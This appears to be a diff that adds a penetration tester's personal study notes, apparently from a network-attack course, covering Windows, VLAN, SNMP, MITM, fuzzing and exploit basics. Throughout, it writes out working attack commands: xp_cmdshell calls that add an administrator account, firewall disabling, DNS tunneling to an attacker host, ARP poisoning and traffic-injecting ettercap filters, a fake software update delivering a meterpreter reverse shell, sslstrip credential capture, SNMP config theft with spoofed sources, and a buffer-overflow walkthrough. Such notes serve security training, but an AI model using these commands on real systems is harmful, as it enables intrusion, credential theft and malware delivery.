@@ -1,0 +1,784 @@
+http://securitytube.net   --> check out this site!!!!
+
+IDA Pro - Disassembler and Debugger
+	http://www.hex-rays.com/idapro/
+
+Software Security Testing:
+	http://www.cigital.com/papers/download/bsi4-testing.pdf
+
+Introduction to Risk Analysis:
+	http://www.security-risk-analysis.com/introduction.htm
+
+Introduction to Fuzzing
+	http://www.brighthub.com/computing/smb-security/articles/9956.aspx
+
+
+Disable Windows Firewall
+	C:\netsh firewall set opmode disable   		(Windowx XP)
+	C:\netsh advfirewall set allprofiles state off 	(Windows 7)
+
+nltest /server:10.10.10.79 /dclist:hackit	-tells you the domain controllers
+
+nslookup 
+	ls -d hackit.tgt	DNS zone transfer
+
+nmap -sL 10.10.10.0/24 -oA /root/nmap_reverse_dns		DNS lookup
+
+SQL Versioning:
+nmap -sV -p 1433 -n 10.10.10.0/24				SQL Version Scan
+nmap -sV -sU -n -p 10.10.10.79 
+Metasploit's mssql_ping
+Foundstones SQLScan
+
+nbtscan.exe -fm 10.10.10.0/24
+	http://unixwiz.net/tools/nbtscan.html
+
+
+dumpusers.exe -bypasses anonymous enumeration restrictions
+
+osql.exe - microsoft utility to execute commands from within MS SQL
+	osql -S 10.10.10.79,1433 -U sa -P secureapp -Q "exec xp_cmdshell 'net user /add <user> pa$$word' "
+	osql -S 10.10.10.79,1433 -U sa -P secureapp -Q "exec xp_cmdshell 'net localgroup administrators /add <user>' "
+
+
+pushvnc - pushes VNC and removes VNC when completed using it
+
+
+
+Credentail Manger -		Control Panel -> User Accounts -> Account -> Manage my network passwords
+
+net use * \\computer_name\share_name /user:<user> /savecred	Built in Single Sign On for Windows machines - 
+
+creddump - decrypts encrypted credentials in Credential Manager - Trips DEP in Windows XP SP2+ and Win2K 2003 SP1+
+				Have to be logged in as the target user who set up Credential Manager
+
+Notepad as a browser -> Open -> File name:  \\192.168.0.1\test.txt
+
+MSPaint as a file transfer tool -> Pait will store an exe file into temp internet files.
+
+
+Tunneling through DNS:
+nslookup -querytype=TXT -timeout=1- evil-dns.attacker.net
+
+Metsploit -> module "/server/file_autopwn"
+
+Basic Process Manipulation Toolkit (BMPT) by Didier Stevens - Exists in exe or dll - acts as a debugger
+				Can manipulate process memory		
+				Command Prompt disabled by GPO?  Start cmd.exe in suspended state
+				Search and replace 'DisableCMD' in memory by 'DisableAMD'
+
+
+Software Restrictions Policy's do not apply to Macros in Microsoft Office
+	Technique to embed an exe as a DLL in a excel spread sheet
+	http://blog.didierstevens.com/2010/02/16/memoryloadlibrary-from-c-program-to-shellcode/
+
+
+iKat Toolkit - Kiosk hacking for Windows and Linux based systems.  - Offers a lot of possibilities to hack
+	from a browser:
+	http://ikat.ha.cked.net
+
+
+
+
+
+	http://ntsecurity.nu/toolbox/dumpusers/
+
+
+
+
+snmpcheck.pl - perl script for checking snmp
+
+
+Additional Enumeration:
+	DumpSec		www.systemtools.com/somarsoft
+	Shareenum	www.sysinternals.com
+	enum.exe	www.darkridge.com/~jpr5/code.html
+	
+
+
+http://www.exploit-db.com/  - replacement for milw0rm - also contains vulnerable apps to test exploits against
+http://vulnerableapp.com - may have a list of vulernable apps to test exploits against
+
+Modify MAC address:
+	ifconfig wlano down hw ether 00:01:02:03:04:05
+	ifconfig wlano up
+	macshift.exe -i "Wireless Network Connect" 000102030405
+
+	pul - Pickupline - 
+		pul
+		start
+		list
+		spoof
+		2
+
+	cpscam - watches for idle connections so you can use their MAC address to bypass NAC solutions (hotel wireless)
+		perl cpscam.pl 10.10.10.0 255.255.255.0
+			to get:  
+				www.willhackforsushi.com/tools/cpscam.pl				
+				prerequisite:  perl -MCPAN -e 'install NetPacket::IP'
+
+	Cisco NAC bypass - Page 23-26 in 660.2
+
+Fuzzing Wired EAP/MD5 - eapmd5fuzzies.py
+
+xtest - performs dictionary attack against EAP-MD5 (NAC Wired) traffic
+	xtest.sf.net
+	./xtest -c capture.pcap -w ~/dictionary.txt
+	tar -xzvf xtest-1.0.tar
+	cd xtest
+	get 'standard in' patch for xtest -> xtest-stdin-warnfix.diff
+		patch -p1 < xtest-stdin-warnfix.diff
+		make
+	now use john the ripper to create a permutated dictionary file, redirecting the output of John to our 
+	modified xtest utility.  John outputs bruteforce attack to xtest as standard in.  Use "-w -" as shown
+		john -wordlist=/dictionary.txt -stdout -rules | xtest -c /capture.pcap -w -
+
+
+good password list on Backtrack:
+	/pentest/passwords/wordlists/darkc0de.lst
+
+****************************************************************************
+
+VLAN Hopping:
+DTP - Dynamic Trunking Protocol. - If you see this in your sniffer you can VLAN Hop.
+
+Yersinia - Multi-function network attack tool - use to VLAN hop
+	yersinia -I
+		press g  to select protocol mode
+		press 2  to select DTP
+		press x  to open DTP attack panel
+		press 1  to become a trunk port
+		select status line indicating truch for details
+
+		VLAN Participation - Use linux:
+			modprobe 8021q
+			vconfig add eth0 100
+			ifconfig eth0.100			
+			vconfig add eth0 200
+			ifconfig eth0.200
+			dhclient eth0.100
+			dhclient eth0.200
+			nmap -sS -F -p 10.10.200.1
+
+			may need to add a route: route add -net 0.0.0.0/0 eth0.200			
+			vconfig rem eth0.100
+
+
+802.1Q Double Encapsulation
+	Attacker must have inside knowledge of target: VLAN number, local VLAN number and addresses
+	yersinia -I
+		press g
+		press e
+		press x
+		press 1
+
+	scapy
+
+
+Voice VLAN Hopping - Phone plugged into switch - PC plugged into Phone
+	sniffed CDP traffic can identify VLANs used, i.e. VLAN 100 or 200:
+			modprobe 8021q
+			vconfig add eth0 100
+			ifconfig eth0.100			
+			vconfig add eth0 200
+			ifconfig eth0.200
+			dhclient eth0.100
+			dhclient eth0.200
+
+	voiphopper - listens for CDP to extract voice VLAN number, creates interface, requests dhcp address
+			includes attack options for Cisco, Avaya and Nortel switches
+
+
+****************************************************************************
+
+Network Manipulation:
+ettercap [OPTIONS] [TARGET] [TARGET2]
+	ettercap -T -q -M arp:remote /<victim ip>// /<IP of target>//   (arp poisons everybody on network)
+
+	ettercap filters -> script source compiled with etterfilter
+		Load filter with Ettercap using "-F myfilter.ef"
+		man etterfilter
+
+		PDF exploit delivery page 77 660.2
+		SMB capture page 78 660.2
+
+Ettercap filter for replacing all images in a web page with your own
+Create a file called pwned.filter and put the following in it
+	if (ip.proto == TCP && tcp.dst == 80) {
+	   if (search(DATA.data, "Accept-Encoding")) {
+	      replace("Accept-Encoding", "Accept-Rubbish!"); 
+		  # note: replacement string is same length as original string
+	      msg("zapped Accept-Encoding!\n");
+	   }
+	}
+	if (ip.proto == TCP && tcp.src == 80) {
+	   replace("img src=", "img src=\"http://10.10.10.70/pwned.jpg\" ");
+	   replace("IMG src=", "img src=\"http://10.10.10.70/pwned.jpg\" ");
+	   msg("pwned image injected\n");
+	}
+
+etterfilter pwned.filter -o pwned.ef
+ettercap -TqM arp:remote -F ./pwned.ef /<victim ip>/ /<target ip gw?>/
+
+
+
+
+HSRP - Hot Standby Rotuer Protocol
+
+VRRP - Virtual Router Redundancy Protocol - standards based replacement for HSRP
+
+Loki - VRRP MITM attack tool
+	OSPF Enumeration
+	
+
+****************************************************************************
+
+Software Updates:
+	ISR Evilgrade - modular exploit tool designed to exploit weak software update methods
+		supports iTunes, Adobe, Quicktime, Notepad-plus and more
+
+		echo "notepad-plus.sourceforge.net A 10.10.10.10" >> /usr/share/ettercap/etter.dns
+		ettercap -TqM are:remote // //
+			dns_spoof
+
+		cd /root/isr-evilgrade/agent/
+		
+		./msfcli exploit/multi/handler PAYLOAD=windows/meterpreter/reverse_tcp LPORT=8080 LHOST=0.0.0.0 E
+		
+		./evilgrade
+			conf notepadplus
+			show options
+			start
+
+		evilgrade dependency -> libdata-dump-perl_1.08-3_all.deb
+
+
+		MITM an update for NotePad Plus:
+		echo "notepad-plus.sourceforge.net A 10.10.10.10" >> /usr/share/ettercap/etter.dns
+		cd /root/isr-evilgrade/agent/
+		./msfpayload windows/meterpreter/reverse_tcp LHOST=<attacker ip> LPORT=8080 X > agent.exe
+		./msfcli exploit/multi/handler PAYLOAD=windows/meterpreter/reverse_tcp LPORT=8080 LHOST=0.0.0.0 E
+		echo "notepad-plus.sourceforge.net A <attacker ip> >> /usr/share/ettercap/etter.dns
+		ettercap -TqM arp:remote /<victim ip>/ /<dns IP,second DNS IP>/
+			p
+			dns_spoof		
+		./evilgrade
+			conf notepadplus
+			show options
+			start
+		
+		On Victim:
+			Download and isntall Notepadd++ npp.5.8.Installer.exe, click ? -> click update
+
+
+
+****************************************************************************
+
+
+Sslstrip	-MITM attack to manipulate HTTP traffic - forces HTTPS traffic to go HTTP
+		Setup:
+			#echo "1" > /proc/sys/net/ipv4/ip_forward   May or may not need this
+			iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080
+			sslstrip -l 8080 -f		#-f is the fab icon to show a lock in the url bar
+			ettercap -TqM arp:remote // //
+			logins and passwords should be displayed in Ettercap
+
+
+
+****************************************************************************
+SNMP
+
+SNMP eavsdropping with ettercap:
+	ettercap -TqM arp:remote // //
+		DNS names my reveal likely SNMP NMS or agenst
+			cacti, mrtg, nagios, etc
+			rtr, router, gig, atm, etc
+
+	nmap -sU -p161 -A 10.10.10.3
+
+fierceDNS enumeration
+	fierce.pl -dns ri.cox.net
+
+Metasploit
+	./msfconsole
+	use auxiliary/scanner/snmp/community
+	set THREADS 2
+	set RHOSTS 10.10.10.1-10.10.10.254
+	exploit
+
+onesixtyone
+	genip 10.10.10.1-254 > hosts.txt
+	onesixtyone -c /usr/share/doc/onesixtyone/dict.txt -i hosts.txt
+
+snmpcheck - Accepts target and a community string as imput
+		uses common MIB OID's to enumerate device
+	snmpcheck.pl -t 10.10.10.4 -c NotSoPublicCommunityString
+
+Change the MIB variable using snmpset:
+snmpwalk -v2c -c public 192.168.31.1 system.sysLocation.0
+snmpset -v2c -c public 192.168.31.1 system.sysLocation.0 s "Foo"
+
+snmpblow.pl - retrieve teh config of a Cisco IOS device
+	apt-get install tftpd-hpa
+	mkdir /tftpboot && chmod 777 /tftpboot
+	wget http://www.scanit.be/uploads/snmpblow.pl
+
+	in.tftp -lcp /tftpboot/
+	echo "private" >communities
+	echo "TargetRWString" >> communities
+	perl snmpblow.pl -d 10.10.10.10 -t 10.10.10.119 -f /tftpboot/switch-config <communities
+	ls -l /tftpboot
+
+
+	Bypass SNMP ACL's
+		perl snmpblow.pl -s 10.10.10.1 -d 10.10.10.10 -t 10.10.10.119 -f /tftpboot/switch-config <communities
+			-s will spoof the source IP so you can get around ACL's
+		
+
+
+SNMP Process:
+	genip 10.10.10.70-80 > targets
+	onesixtyone -i targets -c /usr/share/doc/onesixtyone/dict.txt
+	snmpcheck.pl -t 10.10.10.70 -c public
+	snmpcheck.pl -t 10.10.10.78 -c public
+
+	
+****************************************************************************
+
+Python
+
+python
+>>> import socket
+>>> s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+>>> target = "127.0.0.1"
+>>> port = 4444
+
+#load netcat: nc -l -p 4444 < hello.txt  # put in hello.txt -> "NETCAT SAYS HELLO"
+
+>>> s.connect((target, port))
+>>> print s.recv(1024)
+NETCAT SAYS HELLO
+
+>>> s.close()
+>>>           
+
+
+
+Python Reading:
+	http://diveintopython.org
+	http://docs.python.org
+	http://python.about.com
+	http://wiki.python.org/moin/BeginnersGuide
+	Google coding class on python
+
+
+scapy - python tool used for packet crafting, sniffing and protocol manipulation
+	builds packets in layers that you specify
+	Decodes, but does not interpret packet responses
+
+scapy
+	mypacket = IP(dst="10.10.10.70")
+	mypacket /= TCP(dport=443)			# /= required for each additional layer
+	sr1(mypacket)
+
+
+	ls()
+	ls(IP)
+
+	Reading:
+		http://www.secdev.org/projects/scapy/demo.html
+		http://packetstorm.linuxsecurity.com/papers/general/blackmagic.txt
+		http://www.packetstan.com
+
+	ls(Ether)
+	ls(IP)
+	p = Ether(dst="ff:ff:ff:ff:ff:ff")
+	p.type
+	p /= IP(dst="255.255.255.255", src="0.0.0.0", ttl=64)
+	p.type
+	p.payload
+	p.payload.dst
+	send(packet)	-> sends the L3 packet
+	sendp(packet)	-> sends without adding ethernet header -useful for wireless packet injection
+	sr(packet)	-> send and stop after 1st response.
+
+
+****************************************************************************
+
+Fuzzing
+
+
+Taof 	-The Art of Fuzzing - tool for simple mutation-based fuzzing for windows.  Also acts as proxy -> you give it a
+	sample set of data, you then set the fuzzing points in the data and then fuzz
+	http://sourceforge.net/projects/taof/
+		'debugging' log will show you what attack was successful
+		taof.exe
+
+
+	Unexpected or missing delimiters can be a fruitful fuzzing target - : / , ' ' 
+	
+
+	http://fuzzing.org
+	http://media.techtarget.com/searchSoftwareQuality/downloads/CH21_Fuzzing.pdf
+	http://www.symantec.com/connect/articles/beginners-guide-wireless-auditing
+
+
+****************************************************************************
+Building a Grammar with Sulley
+
+Better version on Windows
+svn checkout http://sulley.googlecode.com/svn/trunk/ sulley
+
+
+
+Netmon	agent that runs on the target or the fuzzing system, capturing and storing libpcap packet capture data sent for 
+	each mutation.
+	requires Impacket and pcapy libraries from CORE Security
+	http://oss.coresecurity.com/projects/pcapy.html
+	http://oss.coresecurity.com/projects/impacket.html
+
+
+Running Sully
+	On Target:	
+		open multiple cmd.exe's
+		start procmon.py
+		start netmon.py
+		start target software
+	On Fuzzer
+		Start fuzzing script
+		Monitor status with Web UI: http://192.168.0.105:26000/
+
+
+File Format Fuzzing
+
+	
+PaiMei - Reverse Engineering Framework
+	
+
+****************************************************************************
+
+
+
+
+Ciphers
+Stream Ciphers and Block Ciphers
+	Stream - Keystream is XOR'd with plaintext to product ciphertext
+		RC4 -> WEP, SSL
+		E0  -> Bluetooth
+		A5/1
+		You can never use the same key twice -> We accomplish this by mixing a per-packet value with 
+		each key.  
+			Initialization Vector (IV)
+			IV is not a secret (usually sent in packet)
+		Must rotate key before IV's repeat
+			How long is the IV - longer IV means more unique keys before key rotation is needed
+			How is the IV selected? - Sequential IV selection?  What happens when the device reboots?
+				IV Wrap?  Random IV selection?
+			Do multiple devices use the same key without IV coordination
+
+	Block Ciphers -
+		AES, DES, 3DES, Blowfish
+		8 byte block length with 64 bytes ciphertext is 57 - 64 bytes plaintext
+
+		Mode of block cipher -
+			AES-CTR
+			3DES-CBC
+			ECB (Electronic Codebook Mode) - bad encryption - program to encrypt an image using ECB:
+				http://www.willhackforsushi.com/code/ecb_encrypt_image.zip
+			CBC (Cipher Block Chaining Mode)
+			CTR
+
+Identifying the Algorithm
+	Examine encrypted data sizes
+		Not evenly divisible by 8: Stream Cipher, often RC4
+		Always divisible by 16: AES (128-bit block size)
+		Inconsistently divisible by 16, always divisible by 8: Des/3Des (64 bit block size)
+
+
+pcaphistogram.pl - shows the randomness of a packet capture payload data
+	pcaphistogrampl.pl capture.pcap | gnuplot
+	display capture.png
+
+
+tcpick and Ent
+	tcpick - used to evaluate the randomness of a packet payload data and it will extract a TCP session to a 
+		binary file for use with Ent
+		tcpick -r capture.pcap -wR
+		ls *.dat
+
+	ent	-checks randomness of a file -> score of 8 is really good
+
+
+
+****************************************************************************
+
+Linux
+
+deadlist/deadlist -> login for Linux VM's
+
+Processor - 
+
+General Purpose 32-bit Registers
+	EAX	-Accumulator Register 	- imul eax,4
+		 designed to work as a calculator
+	EDX	-Data Register		- add eax,edx
+		 Works with EAX on calculations
+		 Pointer to Input/Output Ports
+	ECX 	-Count Register		- move ecx,10
+		 Used often with loops
+	EBX	-Base Register		- inc ebx
+		 General purpose register
+
+	-The lower 16-bits of the 32-bit gernal purpose registers can be referenced independently
+		-The upper and lower 8-bits of the lower 16-bits can also be referenced independently
+		 with ah/al, dh/dl, ch/cl, bh/bl
+
+	ESI	-Source Index
+		 Pointer to read locations during string operations and loops
+		 repz cmpsb %es:(%edi),%ds:(%esi)
+	EDI	-Destination Index
+		 Pointer to write locations during string operations and loops
+	ESP	-Stack Pointer - movl %esp,%ebp
+		 Holds the address of the top of the stack
+		 Changes as data is copied to and removed from the stack
+	EBP	-Base Pointer - popl %ebp
+		 Serves as an anchor point for the stack frame
+		 Used to reference local variables
+
+
+
+Segmet Registers:
+	CS	-Code Segment
+	SS	-Stack Segment
+	DS	-Data Segment
+		 ES	-Extra Segment
+		 FS	-Extra Data Segment - Notable use with Windows
+		 GS	-Extra Data Segment
+
+
+
+Object files:
+	Code Segment	-Fixed size segment containing code
+	Data Segment	-Fixed size segment containing initialized variables
+	BSS Segment	-Fixed size segment containing uninitialized variables
+	Heap		-Segment for dynamic and/or large memory requests
+	Stack Segment	-Procedure stack for the process
+
+Memory Stack
+	Procedure Prolog	#build up
+		-push %ebp
+		-mov %esp,%ebp
+		-sub 0x8,%esp
+
+	Procedure Epilog	#tear down
+		-mov %ebp,%esp
+		-pop %ebp
+		-ret
+
+
+Calling Conventions
+	cdecl		-caller places parameters to called function from right to left and the caller tears down
+			 the stack
+	stdcall		-Parameters placed by caller from right to left, and the called function responsible for
+			 tearing down the stack
+
+
+GNU Debugger
+	disass <function>	-dumps the assembly instructions of the fuction
+				 disass main
+	break <function>	-Pauses execution when the function given is reached
+				 break main
+				 break *0x8048469	#asterisk * required when specifying memory address
+	print			-Prints out the contents of a  register and other variables
+				 print $eip
+	x/<number>i <mem addr> -Examines memory locations
+				 x/20i 0x7c87534d
+	info			-Prints the contents and state of registers and other variables
+				 info registers
+	bt			-backtrace
+
+
+
+
+
+Linkers & Loaders
+	-Linkers link a function name to it actual location
+	-Loaders load a program from storage to memory
+
+	Symbol Resolution	-Resolving the functions address during runtime
+	Relocation		-Address conflicts may require relocation
+	Name Mangling		-The function "main" becomes "_main" or "Z__main__"
+
+
+
+ELF 	Executable and Linking Format
+	-Relocatable Files
+	-Executable Files
+		Can be mapped directly into memory at runtime
+	-Shared Objects
+		Used primarily to house shared functions
+
+	Global Offset Table (GOT)
+		Writable memory sement to store pointers
+		Updated by the Dynamic Linker
+	Procedure Linkage Table (PLT)
+		Symbol resoltution not performed at compile-time
+		Resolution performed when a request is made for the function
+
+
+objdump		-object dump by Eddie C - Performs Disassembly
+		 objdump -d nc  		#disassembles net cat
+		 objdump -j <section name> 	#allows you to specify a section
+		 objdump -h			#displays section headers
+
+readelf
+
+
+
+Linux Memory
+	Heap	Dynamic memory allocated at program runtime
+		Allocation time is not finite
+		Memory is freed by:
+			Program Code
+			Garbage collector
+			Program Termination
+
+
+malloc		-Library of functions used by the C programming language for dynamic memory allocation
+		 Interface to sbrk() and mmap() -breaks sbrk() and mmap() memory allocations into smaller chunks
+
+		 malloc()	-Allocates a chunck of memory
+		 realloc()	-Decreases or increases amount of space allocated
+		 free()		-Frees the previously allocated chunk
+		 calloc()	-initializes data as all 0's
+				 specify an array of N elements, each with a defined size
+
+
+ltrace		-Tool to intercept and record library calls
+		 ltrace ./<my program> 2>&1 |grep 500
+		 ltrace -p (pid)
+		 ltrace -S 		-This command traces system calls as well as library calls
+		 ltrace -f		-This command traces child processes created by fork()
+
+
+
+Shellcode	-code to spawn a shell
+		 Specific to processor type i.e. x86
+		 Injected into a program during exploitation and serves as the 'payload'
+
+
+NASM		-Netwide Assembler by Simon Tatham & Julian Hall is a x86, x86-64 assembler
+
+
+
+
+Smashing the Stack on linux:
+Find Privileged Programs
+	SUID permission-flag runs the program under the context of the owner
+	find / -perm -4000 -o -perm -2000 -exec ls -ldb {} |;
+
+
+
+ls -la ./password
+python -c 'print "A" * 1000' | ./password
+	Segmentation fault
+#Need to get the size of the buffer
+gdb ./password
+	disas main
+	disas checkpw
+
+python -c 'print "A" * 608' | ./pasword
+python -c 'print "A" * 612' | ./pasword
+	Seg Fault
+	#This shows you where the buffer overflow happens
+back in gdb:
+	
+
+x/20x $esp	-> to see 20 Dwords out of memory at breakpoint
+
+
+Address Space Layout Randomization
+Enable ASLR:
+	echo 1 > /proc/sys/kernel/randomize_va_space
+
+Disable ASLR:
+	echo 0 > /proc/sys/kernel/randomize_va_space
+
+
+
+
+
+
+
+****************************************************************************
+
+Windows
+
+OllyDbg Debugger
+
+Immunity Debugger
+	http://www.immunitysec.com
+
+PEDUMP by Matt Pietrek	-displays Portable Executable structure data 
+
+
+
+
+
+
+
+****************************************************************************
+Metasploit
+
+Sample template to build your own Metasploit module
+framework3/documentation/samples/modules/exploits/sample.rb
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
